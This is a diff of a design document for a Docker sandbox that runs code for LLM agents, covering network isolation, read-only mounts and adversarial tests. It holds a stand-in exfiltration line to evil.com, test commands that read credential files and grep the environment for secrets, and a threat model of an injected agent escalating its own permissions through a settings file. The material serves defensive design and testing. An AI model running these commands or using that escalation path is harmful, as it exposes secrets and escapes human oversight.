@@ -102,24 +102,53 @@ last run" stale-state bugs. The one thing ephemerality would normally cost —
 persistent Python dependencies — is recovered by putting the venv in the workspace
 (below).
 
-### Network is enabled
+### Network: `run` has none, `install` has it under a fixed command
 
-The sandbox gets normal network access. Rationale: agents already hold `WebFetch`, and
-`WebFetch("https://evil.com/?d=<secret>")` is a working exfiltration channel today.
-Network in the sandbox adds bandwidth, not a new capability class. It buys `uv pip
-install`, so the dependency set is not frozen behind an image rebuild.
+An earlier draft gave the sandbox unrestricted network on the reasoning that agents
+already hold `WebFetch`, so `WebFetch("https://evil.com/?d=<secret>")` means network
+adds bandwidth rather than a new capability class. That reasoning is correct about
+*exfiltration* and wrong about everything else, which measurement made clear.
 
-What network *does* newly expose is the local network — `host.docker.internal:9500`
-(playwright bridge), `:9501` (this bridge, i.e. recursion), and any LAN service such
-as Home Assistant. `WebFetch` is a fetch-and-summarize tool; raw sockets are not. This
-is mitigated, not eliminated:
+**Measured 2026-07-26.** An ad-hoc `docker run --network bridge` container reached the
+playwright bridge's `/status` endpoint and found `main`'s browser MCP port open:
 
-- The exec bridge requires a shared secret header. The secret is held by the MCP in the
-  bot container and never enters the sandbox environment, closing the recursion path.
-- The concurrency cap and wall timeout bound the blast radius of anything else.
+```
+--- playwright bridge :9500 (bound 127.0.0.1) --- {}
+--- playwright MCP :3846 (bound 127.0.0.1) --- PORT OPEN
+```
 
-Reaching the playwright bridge on `:9500` remains possible. Worst case is an agent
-starting or stopping another agent's browser. Accepted.
+Binding to `127.0.0.1` does **not** protect these services, because Lima's user-mode
+networking proxies `host.docker.internal` (192.168.5.2) through to host loopback. Those
+playwright MCPs drive browsers holding live authenticated sessions. Injected code in
+one agent's sandbox POSTing to another agent's port is **session hijack** — something
+`WebFetch` cannot do, and a capability class of its own. It also collapses exactly the
+agent-to-agent isolation the rest of this design maintains.
+
+Blocking the host alone was considered and rejected. `--add-host
+host.docker.internal:127.0.0.1` is name-only and 192.168.5.2 stays routable; iptables
+inside the Colima VM is state outside docker-compose that will not survive `colima
+start`; `@playwright/mcp` offers only `--allowed-hosts`, a Host-header check a
+container can forge. None of them address the LAN — Home Assistant, the router,
+anything else reachable by raw IP.
+
+**Therefore:**
+
+- `run(command)` gets `--network none`. Arbitrary code never has network.
+- `install(packages)` gets the default bridge network, but can only ever execute
+  `uv pip install` against names matching `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$`. The
+  command shape is fixed by the server; the agent supplies names, never flags. This
+  preserves unfrozen dependencies, which was the entire point of allowing network.
+
+Cost: a script cannot fetch a dataset mid-run. The existing `file-download` MCP already
+covers URL-to-workspace fetching under its own least-privilege rules.
+
+If general network in `run` is ever wanted, the principled design is an egress proxy —
+sandbox on an `internal: true` network with a sidecar allowlisting PyPI. That drops in
+without redesigning anything here, and is deliberately not built now.
+
+**The shared secret stays**, since `install` has network. Note it was over-credited in
+an earlier draft: the schedules/messaging MCP on `:9400` is bound inside the bot
+container with no published port, so that recursion vector was never open regardless.
 
 ### uv with a workspace venv, not `PIP_TARGET`
 
@@ -179,16 +208,38 @@ through a host shell.
 **Concurrency.** A semaphore, **default 1** — see the host environment section for why.
 Requests over the cap queue rather than fail, bounded separately from execution time.
 
+**Output must be capped at the bridge, not just at the MCP.** The MCP truncates to 4000
+characters, but that happens *after* the fact. `subprocess.run(..., capture_output=True)`
+— the `latex-resume` precedent — buffers the entire stdout in the bridge's memory first.
+That is safe for `pdflatex`, whose output is bounded, and unsafe for `run(command)`,
+which is arbitrary: `run("yes")` grows the bridge's RSS until the host OOMs. That is a
+host-side crash triggered from inside the sandbox, defeating the containment the design
+claims. The bridge therefore streams the child's output with a hard byte ceiling
+(1 MiB per stream), discarding the excess and marking that it did so.
+
 ### Component 2 — `docker/exec-sandbox/Dockerfile` (image `claub-exec`)
 
-`python:3.12-slim`, plus:
+`python:3.12-slim` on **linux/arm64**, plus:
 
-- `ffmpeg`, `libcairo2`, `libpango-1.0-0` and friends (Manim's render path)
-- `uv`
-- Baked Python packages: `manim`, `numpy`, `matplotlib`, `networkx`, `pillow`, `pandas`
+- `ffmpeg` and Manim's runtime libraries
+- **A full build toolchain**: `build-essential`, `pkg-config`, `libcairo2-dev`,
+  `libpango1.0-dev`
+- `uv`, pinned
+- Baked Python packages: `manim==0.20.1`, `numpy`, `matplotlib`, `networkx`, `pillow`
 
-Baked rather than installed on demand because a cold `pip install manim` is roughly a
-minute, paid on every render. `uv` covers anything not baked.
+**The toolchain is mandatory on this host, not optional polish.** Verified against PyPI
+for cp312/aarch64: `pycairo` publishes **no Linux wheels at all**, `manimpango`
+publishes **no Linux wheels at all**, and `moderngl` ships manylinux x86_64 wheels but
+**none for aarch64**. All three build from source here. A runtime-libraries-only apt
+list — which an earlier draft specified — fails at `pip install manim` on the first
+attempt.
+
+**The toolchain stays in the final image rather than being stripped in a multi-stage
+build.** It is not only needed for the bake: `install` exists so dependencies aren't
+frozen, and on aarch64 any sdist-only package needs a compiler *at runtime*. Stripping
+it would quietly break that promise on this architecture. Roughly 250 MB, worth it.
+
+`manim` is pinned so phase 2's verified example scenes target a known API.
 
 Never appears in `docker-compose.yml` — it is only ever `docker run --rm`. Built by a
 documented `docker build` step in the bridge README.
@@ -204,11 +255,16 @@ FastMCP server baked into the bot image at `/app/mcps/`, following the `latex-re
 shape: reads `CLAUB_AGENT_NAME` from the environment at startup and fails loudly if
 absent.
 
-One tool:
+Two tools:
 
 ```python
-run(command: str, timeout: int = 180) -> str   # JSON
+run(command: str, timeout: int = 180) -> str        # JSON; --network none
+install(packages: list[str]) -> str                 # JSON; network, fixed command shape
 ```
+
+`install` validates every name against `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$` and
+builds the argv itself, so an agent can never smuggle a flag such as `--index-url`. It
+bootstraps `{workspace}/.venv` on first use.
 
 The agent name is **not** a parameter — it comes from the process environment and goes
 into the URL path. An agent cannot address another agent's sandbox.
@@ -225,24 +281,44 @@ When the bridge is unreachable, the error says so in terms the agent can act on 
 
 ```
 docker run --rm
-  --network bridge
+  --name claub-exec-{agent}-{uuid}
+  --network none
   --read-only
-  --tmpfs /tmp:size=1g,exec
+  --tmpfs /tmp:size=256m,exec
   --cap-drop ALL
   --security-opt no-new-privileges
-  --memory 1g --cpus 1 --pids-limit 256
+  --memory 1g --cpus 1.5 --pids-limit 256
   -e HOME=/tmp
   -e MPLCONFIGDIR=/tmp/mpl
   -e UV_CACHE_DIR=/claub/workspaces/{agent}/.uv-cache
   -e UV_PYTHON_DOWNLOADS=never
   -e PATH=/claub/workspaces/{agent}/.venv/bin:/usr/local/bin:/usr/bin:/bin
   -v {host_workspaces_root}/{agent}:/claub/workspaces/{agent}
+  -v {host_workspaces_root}/{agent}/.claude:/claub/workspaces/{agent}/.claude:ro
   -w /claub/workspaces/{agent}
   claub-exec
   bash -c "<command>"
 ```
 
-Three details that are load-bearing:
+Five details that are load-bearing:
+
+**`.claude/` must be mounted read-only, or the entire design is defeated.** The
+workspace contains a real `.claude/` directory (verified: it holds `agents` and `skills`
+symlinks pointing at `../.claude-agents` and `../.claude-skills`). The Claude CLI runs
+with `cwd` = workspace and merges *project-level* settings from
+`{cwd}/.claude/settings.json` and `settings.local.json`, where allow rules **expand**
+permissions. Claude Code blocks agents from writing there — but that block lives in the
+tool layer, and the sandbox bypasses the tool layer entirely. Without this mount,
+injected code writes a permissive `settings.local.json` and the agent escalates its own
+permissions on its next turn, which is precisely the escape the sandbox exists to
+prevent.
+
+The nested read-only bind is the whole fix, and it costs nothing: agent-authored skills
+still work, because `.claude/skills` is a *symlink* to `../.claude-skills`, which sits
+on the writable parent mount. Writes through the symlink land outside the read-only
+mount.
+
+**`--network none` for `run`.** See the network decision record.
 
 **`bash -c`, not `bash -lc`.** A login shell sources `/etc/profile`, which resets
 `PATH` and would silently discard the workspace venv's `bin` directory — producing
@@ -258,6 +334,22 @@ This is a property of `docker run`, not something the bridge has to actively scr
 render returns a `/work/media/...` path that the agent must translate before putting it
 in a `[FILE:]` marker — a recurring error for no benefit. Identical paths everywhere
 means no translation ever.
+
+**Path identity has one documented exception: compose-injected submounts.**
+`docker-compose.yml:22-24` bind-mounts `/Users/you/repos/shared/data` into three agents
+at `{workspace}/shared-data` — `career`, `analyst`, and **`leetcode-coach`, the
+phase-1 pilot**. Those mounts exist only inside the bot container; on the host,
+`~/docker/claub/workspaces/leetcode-coach/shared-data/` is an empty directory (verified).
+The bridge mounts the host workspace, so the sandbox would see the empty directory —
+reads silently return nothing and writes vanish behind the compose overlay. This is a
+silent data-absence bug, not an error.
+
+Phase 1 handles it by **declaration, not replication**: the bridge config carries an
+optional `extra_mounts` list per agent, and the implementation seeds it from
+`docker-compose.yml` so `shared-data` resolves identically in both containers. The
+`algorithm-animation` skill has no reason to touch it, but leaving a silent
+wrong-answer path in the pilot agent is not acceptable. Any future compose submount
+must be added in both places — noted in the bridge README.
 
 **Root inside the container is accepted.** Under Colima that is root in the Lima VM,
 not on macOS — the same VM boundary the 2026-03-24 investigation weighed when it noted
@@ -352,10 +444,19 @@ bridge's structured error:
 
 ```
 MCP_TOOL_TIMEOUT  >  MCP HTTP client timeout  >  bridge total (queue + exec)  >  exec timeout
+     (existing)            600s                        540s                       180s default
+                                                                                  600s max
 ```
 
-`MCP_TOOL_TIMEOUT` is already raised above default for agent messaging; this must not
-lower it.
+Concrete values so the implementer isn't inventing them. `MCP_TOOL_TIMEOUT` is already
+raised above default for agent messaging; this must not lower it. Queue wait is
+`bridge total − exec timeout`, and exceeding it returns "sandbox busy, N ahead" rather
+than blocking to the outer timeout.
+
+**Unbounded growth.** `{workspace}/.venv` and `{workspace}/.uv-cache` accumulate per
+agent with nothing pruning them. The bot's startup sweep that handles `.attachments/`
+should cover these too — or at minimum the bridge README documents them as manual
+cleanup targets.
 
 ## Dependency management
 
@@ -383,9 +484,15 @@ can corrupt that agent's own notes and skills. Network egress exists, matching t
 exfiltration reach `WebFetch` already provides. Host-side services on the LAN are
 reachable.
 
-**Explicit non-goal.** This is not a VM boundary. Containers share the host kernel, so
-a kernel exploit escapes into the Docker Desktop VM. The threat model is *a
-prompt-injected LLM writing Python*, and for that this is more than sufficient.
+**Explicit non-goal, stated accurately.** This is not a VM boundary. Containers share
+the host kernel, so a kernel exploit escapes into the Colima VM — and that is worse
+than "just a VM" sounds. Colima mounts `$HOME` into the VM over **writable virtiofs**,
+so an escape lands as root somewhere that can write anywhere under `/Users/you`:
+`~/.ssh`, shell rc files, this repo. That is effectively host compromise.
+
+The risk acceptance still stands — the threat model is *a prompt-injected LLM writing
+Python*, not a kernel exploit chain, and the bot container is no better protected — but
+the description of what is being accepted should be honest.
 
 **Verified clear.** The credential-read and cross-agent-write concerns raised by the
 2026-03-24 investigation were probed on 2026-07-26 and are already blocked; no fix was
@@ -416,7 +523,10 @@ agents:
 ```
 
 **`mcp.json`** (per-agent `{name}.mcp.json`) — wires `/app/mcps/sandbox/server.py` with
-`CLAUB_AGENT_NAME` and the bridge secret.
+`CLAUB_AGENT_NAME` and the bridge secret. The secret needs threading end to end: host
+`.envrc` → `docker-compose.yml` environment → bot container → the MCP's `env` block.
+That is a **`docker-compose.yml` change**, which the rest of this design otherwise
+avoids.
 
 **Bridge config** — the host `config.json`, with the same secret and the agent
 allowlist. The allowlist and `agents.yaml` must agree; a mismatch surfaces as a 404 the
@@ -499,8 +609,19 @@ asserted. Each asserts the sandbox *fails*:
 - `cat /root/.claude/.credentials.json` → no such file
 - `ls /claub/workspaces/main` → no such directory
 - `env | grep -iE 'token|key|secret'` → empty
-- `curl http://host.docker.internal:9501/exec/main` without the secret → rejected
 - writing outside the workspace mount → read-only filesystem
+- **`echo x > {workspace}/.claude/settings.local.json` → read-only filesystem.** The
+  escalation path; if this ever passes, the design is broken.
+- **`curl http://host.docker.internal:9500/status` → no network.** Asserts `run` cannot
+  reach the playwright bridge or any browser MCP port. Re-run after any change to the
+  network flags.
+- `curl http://host.docker.internal:9501/exec/main` without the secret → rejected
+  (exercised from `install`, the one path that has network)
+- `install(["--index-url=http://evil"])` → rejected by name validation, no network call
+
+**Re-run these after any Claude CLI version bump.** The bot container's protections are
+upstream behavior rather than configuration, and nothing else here would catch a
+regression.
 
 **Bridge unit tests:** `../` and other traversal in the agent name rejected; unknown
 agent 404s; a command exceeding its timeout sets `timed_out` and the container is
@@ -516,16 +637,35 @@ across two separate `run` calls → a full Manim render ending in a Discord post
 
 ## Phasing
 
-1. **Sandbox.** Bridge daemon, `claub-exec` image, `mcps/sandbox/`, wiring, adversarial
-   suite. Enabled for one agent.
-2. **Visualization.** The `algorithm-animation` shared skill with verified scenes and
+**Prerequisite.** `colima stop && colima start --cpu 4 --memory 4`. Restarts every
+container including all three Claub bots, so pick the moment.
+
+1. **`claub-exec` image — build and smoke-test this FIRST**, before the bridge or the
+   MCP. aarch64 source builds for `pycairo`, `manimpango`, and `moderngl` are the only
+   genuinely uncertain step in the plan; surfacing that while nothing depends on it is
+   worth more than the natural top-down ordering. Success is `manim -ql` rendering a
+   trivial scene inside the container.
+2. **Bridge daemon**, launchd plist with `DOCKER_HOST` pinned, config, README.
+3. **`mcps/sandbox/`** with `run` and `install`, compose secret threading, per-agent
+   wiring. Enabled for one agent.
+4. **Adversarial suite.**
+5. **Visualization** — the `algorithm-animation` shared skill with verified scenes and
    the contact-sheet loop.
 
-Phase 1 is independently valuable and independently testable. Phase 2 is small.
+Steps 1-4 are independently valuable and independently testable. Step 5 is small.
 
 ## Open Items
 
 - Attachments: workspace `.attachments/` (recommended) vs. host bind mount. Not
   blocking phase 1.
 - Whether the `algorithm-animation` skill gets a sanitized copy in `example/`.
-- Result of the separate `permissions.deny` credential-read investigation.
+- Whether `--tmpfs /tmp:size=256m,exec` is accepted in the `path:opts` short form on
+  this Docker version — verify during step 1 rather than assuming. `exec` is needed
+  because Docker's tmpfs defaults to `noexec`.
+- The playwright `PreToolUse` hook at `/claub/config/hooks/validate-playwright.py` runs
+  as a subprocess, outside the tool-permission system, so the new `Read(//claub/config/**)`
+  deny rule should not affect it. That is reasoning, not measurement — confirm with one
+  real browser call next time Playwright is used.
+- Raising `max_concurrent` above 1 requires adding the per-agent lock (documented in
+  Concurrency) and re-checking the invariant
+  `max_concurrent × memory + ~2 GiB ≤ VM RAM`.
